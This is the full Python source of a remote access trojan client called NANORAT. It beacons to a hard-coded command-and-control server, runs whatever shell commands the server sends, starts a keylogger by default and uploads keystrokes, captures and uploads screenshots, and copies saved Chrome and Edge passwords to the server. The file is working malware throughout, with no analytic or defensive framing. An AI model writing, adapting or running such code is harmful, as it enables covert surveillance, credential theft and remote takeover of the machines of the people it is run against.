#!/usr/bin/env python3
"""NANORAT client — non-persistent. Dies with the file."""
import os, sys, time, uuid, json, platform, threading, subprocess
import hashlib, sqlite3, shutil, tempfile
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    sys.exit("pip install requests")

CONFIG = {
    'server': os.environ.get('NANORAT_SERVER', 'https://te-l1hl.onrender.com'),
    'checkin_interval': 30,
    'command_interval': 5,
    'keylogger': True,
}

CLIENT_ID = hashlib.sha256((platform.node() + str(uuid.getnode())).encode()).hexdigest()[:16]
_running = True
_kl_buffer = []
_kl_lock = threading.Lock()


def _post(path, **kw):
    kw.setdefault('timeout', 60)
    try:
        r = requests.post(CONFIG['server'].rstrip('/') + path, timeout=kw.pop('timeout'), **kw)
        return r.json() if r.content else {}
    except Exception as e:
        return {'error': str(e)}


def _get(path, **kw):
    kw.setdefault('timeout', 60)
    try:
        r = requests.get(CONFIG['server'].rstrip('/') + path, timeout=kw.pop('timeout'), **kw)
        return r.json() if r.content else {}
    except Exception as e:
        return {'error': str(e)}


def _is_admin():
    try:
        if platform.system() == 'Windows':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception:
        return False


def _ram():
    try:
        if platform.system() == 'Windows':
            import ctypes
            class MS(ctypes.Structure):
                _fields_ = [('dwLength', ctypes.c_ulong), ('dwMemoryLoad', ctypes.c_ulong), ('ullTotalPhys', ctypes.c_ulonglong), ('ullAvailPhys', ctypes.c_ulonglong), ('ullTotalPageFile', ctypes.c_ulonglong), ('ullAvailPageFile', ctypes.c_ulonglong), ('ullTotalVirtual', ctypes.c_ulonglong), ('ullAvailVirtual', ctypes.c_ulonglong), ('ullAvailExtendedVirtual', ctypes.c_ulonglong)]
            m = MS(); m.dwLength = ctypes.sizeof(m)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
            return "%.1f GB" % (m.ullTotalPhys / (1024 ** 3))
        with open('/proc/meminfo') as f:
            for l in f:
                if l.startswith('MemTotal'):
                    return "%.1f GB" % (int(l.split()[1]) / (1024 ** 2))
    except Exception:
        pass
    return 'unknown'


def info():
    return {'id': CLIENT_ID, 'hostname': platform.node(),
        'username': os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown',
        'os': platform.system(), 'os_version': platform.version(),
        'arch': platform.machine(), 'cpu': platform.processor() or 'unknown',
        'ram': _ram(), 'gpu': 'unknown',
        'privileges': 'admin' if _is_admin() else 'user',
        'av_status': 'unknown'}


def checkin():
    while _running:
        _post('/api/checkin', json=info())
        time.sleep(CONFIG['checkin_interval'])


def poll():
    while _running:
        resp = _get('/api/commands/' + CLIENT_ID)
        for cmd in resp.get('commands', []):
            threading.Thread(target=exec_cmd, args=(cmd,), daemon=True).start()
        time.sleep(CONFIG['command_interval'])


def exec_cmd(cmd):
    cid = cmd['id']; ct = cmd.get('type', 'shell'); c = cmd.get('command', '')
    if cmd.get('require_admin') and not _is_admin():
        _post('/api/command/result', json={'command_id': cid, 'status': 'failed', 'output': 'needs admin'})
        return
    try:
        if ct == 'shell':
            try:
                out = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=60)
                output = out.decode('utf-8', errors='replace')
            except subprocess.CalledProcessError as e:
                output = e.output.decode('utf-8', errors='replace')
            except subprocess.TimeoutExpired:
                output = 'timeout'
        elif ct == 'control':
            output = handle_control(c)
        else:
            output = 'unknown type: ' + str(ct)
        _post('/api/command/result', json={'command_id': cid, 'status': 'completed', 'output': output})
    except Exception as e:
        _post('/api/command/result', json={'command_id': cid, 'status': 'failed', 'output': str(e)})


def handle_control(action):
    a = action.strip()
    if a == 'keylogger start': start_kl(); return 'keylogger started'
    if a == 'keylogger stop': stop_kl(); return 'keylogger stopped'
    if a == 'screenshot': return 'screenshot: ' + shot()
    if a == 'extract_passwords': return 'extracted %d passwords' % extract_pws()
    return 'unknown: ' + a


_kl_running = False
_kl_thread = None


def start_kl():
    global _kl_running, _kl_thread
    if _kl_running: return
    _kl_running = True
    _kl_thread = threading.Thread(target=_kl_loop, daemon=True)
    _kl_thread.start()


def stop_kl():
    global _kl_running
    _kl_running = False


def _kl_loop():
    try:
        from pynput import keyboard
    except ImportError:
        return
    def on_press(key):
        try: ch = key.char
        except AttributeError: ch = '[%s]' % key.name
        with _kl_lock:
            _kl_buffer.append(ch)
            if len(_kl_buffer) > 200:
                flush_kl()
    with keyboard.Listener(on_press=on_press) as l:
        while _kl_running:
            time.sleep(5)
            flush_kl()
        l.stop()


def flush_kl():
    with _kl_lock:
        if not _kl_buffer: return
        text = ''.join(_kl_buffer); _kl_buffer.clear()
    _post('/api/keylog', json={'client_id': CLIENT_ID, 'keystrokes': text, 'window_title': 'unknown', 'process_name': 'unknown'})


def shot():
    try:
        from PIL import ImageGrab
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        path = os.path.join(tempfile.gettempdir(), 'shot_' + ts + '.png')
        ImageGrab.grab().save(path)
        with open(path, 'rb') as f:
            _post('/api/screenshot', files={'file': (os.path.basename(path), f, 'image/png')}, data={'client_id': CLIENT_ID})
        os.unlink(path)
        return os.path.basename(path)
    except Exception as e:
        return 'error: ' + str(e)


def extract_pws():
    n = 0
    home = Path.home()
    for p, br in [
        (home / 'AppData/Local/Google/Chrome/User Data/Default/Login Data', 'chrome'),
        (home / 'AppData/Local/Microsoft/Edge/User Data/Default/Login Data', 'edge'),
    ]:
        if not p.exists(): continue
        try:
            tmp = tempfile.mktemp(suffix='.db')
            shutil.copy2(p, tmp)
            conn = sqlite3.connect(tmp)
            rows = []
            for url, user, pw in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                d = ''
                if pw and not pw.startswith(b'v10') and not pw.startswith(b'v11'):
                    d = pw.decode('utf-8', errors='ignore')
                rows.append({'browser': br, 'url': url, 'username': user, 'password': d})
            conn.close(); os.unlink(tmp)
            if rows:
                _post('/api/passwords', json={'client_id': CLIENT_ID, 'passwords': rows})
                n += len(rows)
        except Exception:
            pass
    return n


def main():
    global _running
    print('[+] NANORAT client id=' + CLIENT_ID)
    print('[+] Server: ' + CONFIG['server'])
    print('[!] non-persistent — process ends when this file is killed/deleted')
    threading.Thread(target=checkin, daemon=True).start()
    threading.Thread(target=poll, daemon=True).start()
    if CONFIG['keylogger']:
        start_kl()
    try:
        while _running:
            time.sleep(1)
    except KeyboardInterrupt:
        _running = False
        stop_kl()
        flush_kl()


if __name__ == '__main__':
    main()

